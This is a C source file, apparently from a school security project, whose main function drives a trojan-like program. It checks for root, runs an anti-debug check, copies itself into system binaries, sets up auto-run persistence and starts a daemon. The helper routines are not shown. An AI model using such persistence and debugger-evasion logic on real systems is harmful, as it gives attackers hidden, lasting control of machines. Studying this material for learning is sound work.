/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
/*   Updated: 2025/03/25 23:23:46 by kiroussa         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <shield.h>
#include <shield/daemon.h>
#include "antidebug.inc.c"
#include <stdio.h>
#include <unistd.h>

#define LOGINS "kiroussa & lvincent"

/**
 * @brief	Malicious intents. 
 *
 * This function will:
 *	- Copy the program to the system's binaries directory.
 *	  - Modify the entrypoint to the daemon's entry.
 *	  - Change the permissions of the binary to 0755.
 *  - Create the auto-run files.
 *  - Launch the daemon.
 */
static inline void	shield_malicious_intents(void)
{
	DEBUG("shield_copy\n");
	if (!shield_copy())
		return ;
	DEBUG("shield_autorun_setup\n");
	if (!shield_autorun_setup())
		return ;
	DEBUG("shield_daemonize\n");
	shield_daemonize();
	DEBUG("done\n");
}

int	main(void)
{
	const int	euid = geteuid();

	DEBUG("got euid: %d\n", euid);
	if (euid != 0)
	{
		if (SHIELD_DEBUG)
		{
			DEBUG("Skipping root check\n");
		}
		else
		{
			puts("You need to run this program as root!");
			return (1);
		}
	}
	if (shield_antidebug())
	{
		DEBUG("passed anti-debug check\n");
		shield_malicious_intents();
		DEBUG("malicious intents done\n");
	}
	puts(LOGINS);
	return (0);
}
